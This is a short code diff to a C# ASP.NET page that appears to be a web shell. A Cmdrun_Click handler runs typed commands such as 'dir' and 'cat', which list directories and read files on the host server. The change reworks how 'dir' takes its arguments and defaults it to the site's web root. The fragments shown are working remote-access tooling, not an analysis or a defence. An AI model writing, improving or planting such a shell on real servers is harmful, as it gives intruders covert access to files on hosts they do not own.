@@ -28,8 +28,9 @@
 
 
 
-    string Dir(string path)
+    string Dir(params string[] directories)
     {
+        string path = directories.Length > 1 ? directories[1] : Server.MapPath("~");
         StringBuilder sbl = new StringBuilder();
         if (path.StartsWith("~"))
         {
@@ -259,8 +260,6 @@
             }
         sbl.Append("</table>");
         return sbl.ToString();
-
-
     }
 
     protected void Cmdrun_Click(object sender, EventArgs e)
@@ -271,7 +270,7 @@
         switch (command.ToLower())
         {
             case "dir":
-                result = this.Dir(commands[1]);
+                result = this.Dir(commands);
                 break;
             case "cat":
                 result = this.Read(commands[1]);
